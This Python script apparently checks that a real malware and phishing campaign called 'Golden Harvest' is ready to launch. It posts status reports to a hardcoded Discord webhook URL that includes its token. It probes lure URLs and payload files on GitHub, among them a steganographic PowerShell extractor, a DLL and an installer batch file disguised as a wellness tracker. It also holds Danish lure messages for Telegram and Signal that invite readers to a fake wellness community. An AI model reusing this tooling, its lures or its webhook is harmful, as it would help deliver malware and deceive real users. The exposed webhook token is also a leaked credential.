#!/usr/bin/env python3
"""
Complete Payload Testing System
Operation: Golden Harvest - Pre-Deployment Verification
"""

import requests
import json
import time
import os
from urllib.parse import urlparse
import subprocess

class PayloadTester:
    def __init__(self):
        self.webhook_url = "https://discord.com/api/webhooks/1417442947686731856/1UGJsXCLBqIZmb2shm4CjxJhAzZtObsbKtbStAmPg5jKtvbVt9WqRfRkNZ6ymjuiDS95"
        
        self.test_urls = [
            "https://hollistisk-v2.vercel.app/",
            "https://tinyurl.com/ywaqtgcr",
            "https://v.gd/n7F16W",
            "https://short-url.org/hollistisk-v2VIP",
            "https://raw.githubusercontent.com/Jeki1234121/hollistisk-v2/main/legitimate_landing.html",
            "https://cdn.jsdelivr.net/gh/Jeki1234121/hollistisk-v2/legitimate_landing.html"
        ]
        
        self.telegram_signal_message = {
            "telegram": "🧘‍♀️ Ny holistisk wellness community! Over 1200 medlemmer fra Danmark. Join her: https://short-url.org/hollistisk-v2VIP 🌿",
            "signal": "🌿 Hey! Fandt denne fede wellness gruppe med 1200+ danske medlemmer. Masse gode meditation tips! https://short-url.org/hollistisk-v2VIP 🧘‍♀️"
        }

    def send_test_beacon(self, test_name, status, details=""):
        """Send test results to Discord"""
        try:
            payload = {
                "content": f"🧪 **PAYLOAD TEST - {test_name}**\n**Status:** {status}\n**Details:** {details}\n**Time:** {time.strftime('%Y-%m-%d %H:%M:%S')}"
            }
            requests.post(self.webhook_url, json=payload, timeout=5)
        except:
            pass

    def test_url_accessibility(self):
        """Test if all URLs are accessible"""
        print("🌐 TESTING URL ACCESSIBILITY")
        print("=" * 50)
        
        results = {}
        for url in self.test_urls:
            try:
                response = requests.get(url, timeout=10, allow_redirects=True)
                if response.status_code == 200:
                    status = "✅ ACCESSIBLE"
                    results[url] = True
                else:
                    status = f"❌ HTTP {response.status_code}"
                    results[url] = False
                    
                print(f"{url}")
                print(f"   Status: {status}")
                print(f"   Final URL: {response.url}")
                print()
                
                # Send individual test result
                self.send_test_beacon("URL_TEST", status, f"URL: {url}")
                
            except Exception as e:
                print(f"{url}")
                print(f"   Status: ❌ ERROR - {str(e)}")
                print()
                results[url] = False
                self.send_test_beacon("URL_TEST", "❌ ERROR", f"URL: {url}, Error: {str(e)}")
        
        return results

    def test_payload_files(self):
        """Test if payload files exist and are accessible"""
        print("\n🎯 TESTING PAYLOAD FILES")
        print("=" * 50)
        
        payload_files = [
            "wellness_community.png",
            "stego_extractor.ps1", 
            "wellness_tracker.dll",
            "install_wellness_tracker.bat",
            "w.html"
        ]
        
        results = {}
        for filename in payload_files:
            github_url = f"https://raw.githubusercontent.com/Jeki1234121/hollistisk-v2/main/{filename}"
            
            try:
                response = requests.head(github_url, timeout=10)
                if response.status_code == 200:
                    status = "✅ ACCESSIBLE"
                    results[filename] = True
                else:
                    status = f"❌ HTTP {response.status_code}"
                    results[filename] = False
                    
                print(f"{filename}: {status}")
                self.send_test_beacon("PAYLOAD_FILE", status, f"File: {filename}")
                
            except Exception as e:
                print(f"{filename}: ❌ ERROR - {str(e)}")
                results[filename] = False
                self.send_test_beacon("PAYLOAD_FILE", "❌ ERROR", f"File: {filename}, Error: {str(e)}")
        
        return results

    def test_webhook_connectivity(self):
        """Test Discord webhook connectivity"""
        print("\n📡 TESTING WEBHOOK CONNECTIVITY")
        print("=" * 50)
        
        try:
            test_payload = {
                "content": "🧪 **WEBHOOK TEST**\nThis is a connectivity test from the payload tester.\nAll systems operational! 🚀"
            }
            response = requests.post(self.webhook_url, json=test_payload, timeout=10)
            
            if response.status_code in [200, 204]:
                print("✅ Webhook connectivity: WORKING")
                return True
            else:
                print(f"❌ Webhook error: HTTP {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Webhook connectivity: ERROR - {str(e)}")
            return False

    def test_obfuscated_scripts(self):
        """Test if obfuscated Python scripts work"""
        print("\n🛡️  TESTING OBFUSCATED SCRIPTS")
        print("=" * 50)
        
        obfuscated_dir = "obfuscated"
        if not os.path.exists(obfuscated_dir):
            print("❌ Obfuscated directory not found")
            return False
        
        scripts = [f for f in os.listdir(obfuscated_dir) if f.endswith('.py')]
        
        for script in scripts[:2]:  # Test first 2 scripts only
            script_path = os.path.join(obfuscated_dir, script)
            try:
                # Try to import the script (syntax check)
                result = subprocess.run(['python', '-m', 'py_compile', script_path], 
                                      capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0:
                    print(f"✅ {script}: SYNTAX OK")
                    self.send_test_beacon("OBFUSCATED_SCRIPT", "✅ SYNTAX OK", f"Script: {script}")
                else:
                    print(f"❌ {script}: SYNTAX ERROR")
                    self.send_test_beacon("OBFUSCATED_SCRIPT", "❌ SYNTAX ERROR", f"Script: {script}")
                    
            except Exception as e:
                print(f"❌ {script}: ERROR - {str(e)}")
                self.send_test_beacon("OBFUSCATED_SCRIPT", "❌ ERROR", f"Script: {script}, Error: {str(e)}")
        
        return True

    def simulate_telegram_signal_campaign(self):
        """Simulate Telegram/Signal campaign messages"""
        print("\n📱 TELEGRAM/SIGNAL CAMPAIGN SIMULATION")
        print("=" * 50)
        
        print("📞 TELEGRAM MESSAGE:")
        print(f'   "{self.telegram_signal_message["telegram"]}"')
        print()
        
        print("📶 SIGNAL MESSAGE:")
        print(f'   "{self.telegram_signal_message["signal"]}"')
        print()
        
        # Send campaign readiness beacon
        campaign_info = {
            "content": f"🎯 **CAMPAIGN READY FOR TELEGRAM/SIGNAL**\n\n**Telegram Message:**\n{self.telegram_signal_message['telegram']}\n\n**Signal Message:**\n{self.telegram_signal_message['signal']}\n\n**Target URL:** https://short-url.org/hollistisk-v2VIP\n\n**Status:** Ready for live deployment! 🚀"
        }
        
        try:
            requests.post(self.webhook_url, json=campaign_info, timeout=5)
            print("✅ Campaign info sent to Discord")
        except:
            print("❌ Failed to send campaign info")

    def generate_test_report(self, url_results, payload_results, webhook_ok):
        """Generate comprehensive test report"""
        print("\n📊 COMPREHENSIVE TEST REPORT")
        print("=" * 60)
        
        # URL Tests
        accessible_urls = sum(1 for result in url_results.values() if result)
        total_urls = len(url_results)
        print(f"🌐 URL ACCESSIBILITY: {accessible_urls}/{total_urls} working")
        
        if accessible_urls < total_urls:
            print("   ⚠️  Some URLs may be blocked or down")
        
        # Payload Tests  
        accessible_payloads = sum(1 for result in payload_results.values() if result)
        total_payloads = len(payload_results)
        print(f"🎯 PAYLOAD FILES: {accessible_payloads}/{total_payloads} accessible")
        
        # Webhook Test
        print(f"📡 WEBHOOK: {'✅ Working' if webhook_ok else '❌ Failed'}")
        
        # Overall Assessment
        print("\n🎪 OVERALL ASSESSMENT:")
        if accessible_urls >= 3 and accessible_payloads >= 3 and webhook_ok:
            print("   ✅ READY FOR LIVE DEPLOYMENT")
            print("   🎯 Telegram/Signal campaign can proceed")
            assessment = "READY"
        else:
            print("   ⚠️  SOME ISSUES DETECTED")
            print("   🔧 Fix issues before live deployment")
            assessment = "NEEDS_FIXES"
        
        # Send final report to Discord
        final_report = {
            "content": f"📊 **FINAL TEST REPORT**\n**URLs:** {accessible_urls}/{total_urls} working\n**Payloads:** {accessible_payloads}/{total_payloads} accessible\n**Webhook:** {'Working' if webhook_ok else 'Failed'}\n**Assessment:** {assessment}\n\n{'🚀 Ready for Telegram/Signal deployment!' if assessment == 'READY' else '🔧 Fix issues before deployment'}"
        }
        
        try:
            requests.post(self.webhook_url, json=final_report, timeout=5)
        except:
            pass

if __name__ == "__main__":
    print("🎯 GOLDEN HARVEST - Complete Payload Testing")
    print("=" * 60)
    print("Testing all components before Telegram/Signal deployment...\n")
    
    tester = PayloadTester()
    
    # Run all tests
    url_results = tester.test_url_accessibility()
    payload_results = tester.test_payload_files()
    webhook_ok = tester.test_webhook_connectivity()
    tester.test_obfuscated_scripts()
    tester.simulate_telegram_signal_campaign()
    
    # Generate final report
    tester.generate_test_report(url_results, payload_results, webhook_ok)
    
    print(f"\n🎪 TESTING COMPLETE!")
    print(f"Check your Discord webhook for detailed results!")
    print(f"\n🚀 READY FOR TELEGRAM/SIGNAL DEPLOYMENT:")
    print(f"Target URL: https://short-url.org/hollistisk-v2VIP")